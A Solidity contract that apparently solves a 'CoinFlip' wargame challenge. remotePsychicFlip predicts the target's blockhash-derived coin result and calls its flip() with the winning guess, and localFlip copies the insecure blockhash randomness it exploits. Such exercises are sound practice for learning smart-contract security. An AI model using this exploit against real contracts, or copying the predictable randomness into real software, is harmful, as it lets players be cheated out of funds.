// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DeployedCoinFlip {
  function flip(bool _g1) external returns(bool);
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 public lastHash;
  uint256 public coinFlip; // solidity does not know floats, so it will round 1.111 to 1. and 0.9 to 0.
  uint256 public blockValue; //define blockValue outside of the function to be able to read it...
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  bool public side;

  constructor() {
    consecutiveWins = 0;
  }
  
  function remotePsychicFlip(address _addr) public {
    DeployedCoinFlip myFlip = DeployedCoinFlip(_addr);
    blockValue = uint256(blockhash(block.number - 1));
    coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;

    myFlip.flip(side);
  }

  function localFlip(bool _guess) public returns (bool) {
    blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
  
  function localPsychicFlip() public {
    blockValue = uint256(blockhash(block.number - 1));
    coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;

    localFlip(side);
  }

  // create a function that calls the deployed CoinFlip instance and flips for us, along with the guessed estimate

  // blank flip function, simply returns the value of the flip.
  function positiveFlip() public {
    localFlip(true);
  }

  function setCoinFlip() public {
    blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    coinFlip = blockValue / FACTOR;

    if(coinFlip < 1) {
      localFlip(false);
    } else {
      revert();
    }
  }

  function blankFlip() public returns (bool) {
    blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;

    if (side) {
      localFlip(true);
      return true;
    } else {
      localFlip(false);
      return false;
    }
  }

}